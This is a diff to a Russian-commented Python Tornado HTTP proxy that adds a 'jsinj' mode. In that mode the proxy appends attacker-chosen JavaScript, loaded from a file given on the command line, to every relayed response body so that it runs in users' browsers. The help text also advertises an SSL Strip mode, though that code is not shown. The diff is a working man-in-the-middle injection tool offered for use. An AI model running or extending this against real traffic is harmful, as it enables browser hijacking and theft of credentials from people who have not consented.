@@ -7,6 +7,7 @@ import tornado.httputil
 import sys
 import os, platform, logging
 import socket
+import argparse
 from urllib.parse import urlparse
 
 #Создание лог файла
@@ -16,6 +17,7 @@ if platform.platform().startswith('Windows'):
 else:
     logging_file = os.path.join(os.getenv('HOME'), \
                                 'log_proxy_server.log')
+
 
 print("Сохраняем лог в ", logging_file)
 
@@ -28,6 +30,12 @@ logging.basicConfig(
 )
 
 __all__ = ['ProxyHandler', 'run_proxy']
+
+
+def get_js_for_inj(file):
+    """Функция для чтения JavaScript из файла"""
+    with open(file, 'rb') as f:
+        return f.read()
 
 
 def get_proxy(url):
@@ -53,9 +61,12 @@ def fetch_request(url, callback, **kwargs):
     client = tornado.httpclient.AsyncHTTPClient()
     client.fetch(req, callback, raise_error=False)
 
-
 class ProxyHandler(tornado.web.RequestHandler):
     SUPPORTED_METHODS = ['GET', 'POST', 'CONNECT']
+
+    def initialize(self, m=None, j=None):
+        self.mode = m
+        self.jscript = j
 
     def compute_etag(self):
         return None  # disable tornado Etag
@@ -79,9 +90,13 @@ class ProxyHandler(tornado.web.RequestHandler):
 
                 logging.info("Header request: {}".format(self.request.headers))
 
-                if response.body:
-                    self.set_header('Content-Length', len(response.body ) + int(53))
-                    self.write(response.body + b'<script>alert("Injected JavaScript code!!!")</script>')
+                if (response.body and self.mode == 'jsinj'):
+                    self.set_header('Content-Length', len(response.body) + len(self.jscript))
+                    self.write(response.body + self.jscript)
+                    logging.info("Body response: {}".format(response.body))
+                elif response.body:
+                    self.set_header('Content-Length', len(response.body))
+                    self.write(response.body)
                     logging.info("Body response: {}".format(response.body))
             self.finish()
 
@@ -170,26 +185,52 @@ class ProxyHandler(tornado.web.RequestHandler):
             upstream.connect((host, int(port)), start_tunnel)
 
 
-def run_proxy(port, start_ioloop=True):
+#def run_proxy(port, start_ioloop=True):
+
+def run_proxy(port, mode=None, jscript=None, start_ioloop=True):
     """
     Run proxy on the specified port. If start_ioloop is True (default),
     the tornado IOLoop will be started .immediately
     """
-    app = tornado.web.Application([
-        (r'.*', ProxyHandler),
-    ])
+    payload_js = None
+    try:
+        if len(sys.argv) < 2:
+            print("Вы должны указать по крайней мере один параметр это номер порта. Пример -p 8080")
+            sys.exit(1)
+        elif mode == 'jsinj':
+            payload_js = get_js_for_inj(jscript)
+            app = tornado.web.Application([
+                (r'.*', ProxyHandler, dict(m=mode, j=payload_js))
+            ])
+        else:
+            app = tornado.web.Application([
+                (r'.*', ProxyHandler),
+            ])
+    except Exception as e:
+        print("Не верные параметры скрипта!\n")
+        sys.exit(1)
+
     app.listen(port)
     ioloop = tornado.ioloop.IOLoop.instance()
     if start_ioloop:
         ioloop.start()
 
 if __name__ == '__main__':
-    port = 8080
-    if len(sys.argv) > 1:
-        port = int(sys.argv[1])
 
-    print("Starting HTTP proxy on port %d" % port)
-    run_proxy(port)
+    parser = argparse.ArgumentParser(description="Мдуль ProxyServer может работать в двух режимах \
+                                                 1. JavaScript Injection \
+                                                 2. SSL Strip. Если режим не задан он работает штатно.")
+    parser.add_argument('-p', '--port', default=8080, type=int, help='Порт на котором будет работать прокси-сервер.')
+    parser.add_argument('-m', '--mode', default=None, type=str, help='Задает режим работы прокси-сервера. \
+                        Если mode=jsinj, прокси-сервер к ответам пользователям будет добавлять JavaScript, \
+                        который задается в параметре -j')
+    parser.add_argument('-j', '--jscript', default=None, type=str, help="Указываем файл с JavaScript, который выполнится в \
+                        браузере пользователя. Пример test_js")
+    args = parser.parse_args()
+
+    print("Starting HTTP proxy on port %d" % args.port)
+
+    run_proxy(args.port, args.mode, args.jscript)
 
 
 
